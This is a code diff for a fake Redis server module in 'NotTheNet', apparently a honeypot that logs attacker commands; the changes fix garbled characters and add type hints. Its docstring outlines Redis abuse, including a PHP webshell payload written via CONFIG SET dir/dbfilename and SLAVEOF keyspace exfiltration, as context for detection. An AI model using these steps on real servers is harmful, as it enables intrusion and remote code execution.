@@ -3,21 +3,21 @@ NotTheNet - Fake Redis Server (TCP port 6379)
 
 Why this matters:
     Redis on an exposed port is heavily abused for:
-      - Cryptominer C2       â€” SLAVEOF <actor-ip> to exfiltrate the keyspace
-      - Webshell planting    â€” CONFIG SET dir /var/www + CONFIG SET dbfilename
+      - Cryptominer C2       — SLAVEOF <actor-ip> to exfiltrate the keyspace
+      - Webshell planting    — CONFIG SET dir /var/www + CONFIG SET dbfilename
                                shell.php + SET payload <?php system($_GET[e]); ?>
                                + SAVE to write a file to the web root
-      - Privilege escalation â€” write SSH authorized_keys via CONFIG SET dir
-      - DarkComet/NjRAT      â€” some variants use Redis as a C2 message queue
+      - Privilege escalation — write SSH authorized_keys via CONFIG SET dir
+      - DarkComet/NjRAT      — some variants use Redis as a C2 message queue
 
     This service responds to all common RESP commands and logs every command
     issued.  The SLAVEOF / REPLICAOF and CONFIG SET dir / dbfilename commands
     are explicitly flagged as high-interest in the log.
 
     RESP (Redis Serialization Protocol) is simple enough to parse inline:
-      *N\\r\\n â€” array of N elements
-      $N\\r\\n  â€” bulk string of N bytes
-      +string\\r\\n â€” simple string
+      *N\\r\\n — array of N elements
+      $N\\r\\n  — bulk string of N bytes
+      +string\\r\\n — simple string
       Inline commands: PING\\r\\n (legacy format)
 
 Security notes (OpenSSF):
@@ -28,10 +28,14 @@ Security notes (OpenSSF):
 - Sessions are bounded to SESSION_TIMEOUT seconds
 """
 
+from __future__ import annotations
+
+import contextlib
 import logging
 import socket
 import threading
 from collections.abc import Callable
+from typing import Any
 
 from utils.json_logger import get_json_logger
 from utils.logging_utils import sanitize_ip, sanitize_log_string
@@ -60,13 +64,13 @@ _HIGH_INTEREST_CMDS = frozenset(["SLAVEOF", "REPLICAOF", "CONFIG", "DEBUG", "SAV
 class _RedisSession(threading.Thread):
     """Handles one Redis client session using RESP protocol."""
 
-    def __init__(self, conn: socket.socket, addr: tuple, sem: threading.BoundedSemaphore | None = None):
+    def __init__(self, conn: socket.socket, addr: tuple[str, int], sem: threading.BoundedSemaphore | None = None) -> None:
         super().__init__(daemon=True)
         self.conn = conn
         self.addr = addr
         self._sem = sem
 
-    # â”€â”€ RESP reader â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── RESP reader ──────────────────────────────────────────────────────────
 
     def _readline(self) -> bytes | None:
         """Read until \\r\\n (max 4 KB). Returns line without the terminator."""
@@ -81,7 +85,7 @@ class _RedisSession(threading.Thread):
             if buf.endswith(b"\r\n"):
                 return buf[:-2]
 
-    def _read_bulk_string(self) -> "str | None":
+    def _read_bulk_string(self) -> str | None:
         """Read one RESP bulk-string ($<len>\r\n<data>\r\n). Returns str or None."""
         hdr = self._readline()
         if hdr is None or not hdr.startswith(b"$"):
@@ -100,7 +104,7 @@ class _RedisSession(threading.Thread):
             data += chunk
         return data[:slen].decode("utf-8", errors="replace")
 
-    def _read_resp_array(self, n: int) -> "list[str] | None":
+    def _read_resp_array(self, n: int) -> list[str] | None:
         """Read *n* RESP bulk-string elements. Returns list or None on error."""
         parts: list[str] = []
         total_bytes = 0
@@ -113,7 +117,7 @@ class _RedisSession(threading.Thread):
                 return None
             parts.append(elem)
         return parts
-    def _read_command(self) -> list[str | None]:
+    def _read_command(self) -> list[str] | None:
         """
         Parse one RESP command.  Returns a list of strings (the command and
         its arguments) or None on connection close / parse error.
@@ -136,24 +140,22 @@ class _RedisSession(threading.Thread):
         # Inline command (legacy, e.g. PING\r\n)
         return line.decode("utf-8", errors="replace").split()
 
-    # â”€â”€ RESP response helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── RESP response helpers ─────────────────────────────────────────────────
 
-    def _send(self, data: bytes):
-        try:
+    def _send(self, data: bytes) -> None:
+        with contextlib.suppress(OSError):
             self.conn.sendall(data)
-        except OSError:
-            pass
 
-    def _ok(self):       self._send(b"+OK\r\n")
-    def _pong(self):     self._send(b"+PONG\r\n")
-    def _nil(self):      self._send(b"$-1\r\n")
-    def _empty_array(self): self._send(b"*0\r\n")
+    def _ok(self) -> None:       self._send(b"+OK\r\n")
+    def _pong(self) -> None:     self._send(b"+PONG\r\n")
+    def _nil(self) -> None:      self._send(b"$-1\r\n")
+    def _empty_array(self) -> None: self._send(b"*0\r\n")
 
-    def _bulk(self, s: str):
+    def _bulk(self, s: str) -> None:
         enc = s.encode()
         self._send(f"${len(enc)}\r\n".encode() + enc + b"\r\n")
 
-    def _error(self, msg: str):
+    def _error(self, msg: str) -> None:
         self._send(f"-ERR {msg}\r\n".encode())
 
     def _cmd_ping(self, args: list[str]) -> bool:
@@ -189,7 +191,7 @@ class _RedisSession(threading.Thread):
     # Commands that return *0 (empty array)
     _ARRAY_CMDS = frozenset(["COMMAND"])
 
-    _CMD_DISPATCH: "dict[str, Callable]" = {
+    _CMD_DISPATCH: dict[str, Callable[[_RedisSession, list[str]], bool]] = {
         "PING": _cmd_ping,
         "INFO": _cmd_info,
         "CONFIG": _cmd_config,
@@ -200,7 +202,7 @@ class _RedisSession(threading.Thread):
         """Handle one Redis command. Returns False to close the connection."""
         handler = self._CMD_DISPATCH.get(cmd)
         if handler:
-            return handler(self, args)  # type: ignore[operator]
+            return handler(self, args)
         if cmd in self._OK_CMDS:
             self._ok()
         elif cmd in self._NIL_CMDS:
@@ -211,7 +213,7 @@ class _RedisSession(threading.Thread):
             self._error(f"unknown command '{cmd}'")
         return True
 
-    # â”€â”€ Session main â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── Session main ─────────────────────────────────────────────────────────
 
     def run(self) -> None:
         safe_addr = sanitize_ip(self.addr[0])
@@ -252,10 +254,8 @@ class _RedisSession(threading.Thread):
         except OSError:
             logger.debug("Redis session error", exc_info=True)
         finally:
-            try:
+            with contextlib.suppress(OSError):
                 self.conn.close()
-            except OSError:
-                pass
             if self._sem:
                 self._sem.release()
 
@@ -263,7 +263,7 @@ class _RedisSession(threading.Thread):
 class RedisService:
     """Fake Redis server on TCP port 6379."""
 
-    def __init__(self, config: dict, bind_ip: str = "0.0.0.0"):
+    def __init__(self, config: dict[str, Any], bind_ip: str = "0.0.0.0") -> None:
         self.enabled = config.get("enabled", True)
         self.port = int(config.get("port", 6379))
         self.bind_ip = bind_ip
@@ -310,10 +310,8 @@ class RedisService:
     def stop(self) -> None:
         self._stop.set()
         if self._sock:
-            try:
+            with contextlib.suppress(OSError):
                 self._sock.close()
-            except OSError:
-                pass
         if self._thread:
             self._thread.join(timeout=3.0)
         logger.info("Redis service stopped.")
